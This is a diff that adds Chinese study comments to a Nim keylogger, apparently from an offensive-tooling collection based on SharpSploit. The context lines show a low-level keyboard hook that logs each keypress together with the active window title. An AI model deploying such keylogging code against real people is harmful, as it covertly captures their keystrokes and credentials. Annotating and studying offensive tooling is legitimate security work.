@@ -2,7 +2,7 @@
     Authors: Marcello Salvati (@byt3bl33d3r), Scottie Austin (@checkymander) & Kiran Patel
     License: BSD 3-Clause
 
-    References: 
+    References: 参考这个项目得代码
         - https://github.com/cobbr/SharpSploit/blob/2fdfc2eec891717884484bb7dde15f8a12113ad3/SharpSploit/Enumeration/Keylogger.cs
 ]#
 
@@ -11,7 +11,7 @@ import tables
 import strformat
 import strutils
 
-type
+type  # 定义枚举 键盘
     Keys = enum
         Modifiers = -65536
         None = 0
@@ -302,7 +302,7 @@ proc GetActiveWindowTitle(): LPWSTR =
     defer: CloseHandle(wHandle)
     GetWindowText(wHandle, builder, capacity)
     return builder
-
+# hook回调函数
 proc HookCallback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =    
     if nCode >= 0 and wParam == WM_KEYDOWN:
         var keypressed: string
@@ -324,7 +324,7 @@ proc HookCallback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdca
 
         echo fmt"[*] Key: {keypressed} [Window: '{currentActiveWindow}']"
     return CallNextHookEx(0, nCode, wParam, lParam)
-
+# hook键盘的函数
 var hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) HookCallback, 0,  0)
 if bool(hook):
     try:
